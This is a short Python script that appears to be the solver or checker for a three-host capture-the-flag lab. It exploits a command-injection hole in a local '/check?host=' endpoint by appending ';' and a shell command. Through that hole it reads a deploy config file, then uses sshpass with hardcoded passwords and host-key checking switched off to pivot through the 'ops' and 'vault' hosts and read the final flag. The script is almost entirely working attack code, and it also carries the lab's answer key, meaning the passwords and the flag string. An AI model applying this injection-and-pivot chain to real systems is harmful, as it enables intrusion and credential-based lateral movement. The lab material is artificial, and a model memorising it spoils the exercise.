#!/usr/bin/env python3
import json
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8090/check?host="

def edge_command(command):
    payload = "127.0.0.1;" + command
    with urllib.request.urlopen(BASE + urllib.parse.quote(payload), timeout=8) as r:
        return r.read().decode()

def main():
    assert urllib.request.urlopen("http://127.0.0.1:8090/health", timeout=5).read() == b"ok\n"
    handoff1 = edge_command("cat /srv/edge/config/deploy.env")
    assert "OPS_HOST=ops" in handoff1 and "OPS_USER=operator" in handoff1
    ops_handoff = edge_command(
        "sshpass -p 'EdgeOps_Transit_7f3!' ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null operator@ops 'cat /home/operator/archive-handoff.txt'"
    )
    assert "VAULT_HOST=vault" in ops_handoff and "VAULT_USER=analyst" in ops_handoff
    final = edge_command(
        "sshpass -p 'EdgeOps_Transit_7f3!' ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null operator@ops "
        "\"sshpass -p 'ArchiveVault_9c2!' ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null analyst@vault 'cat /home/analyst/final.flag'\""
    )
    assert "CTF{three_hosts_one_final_vault}" in final
    print(json.dumps({"edge": "passed", "ops": "passed", "vault": "passed"}))

if __name__ == "__main__":
    main()
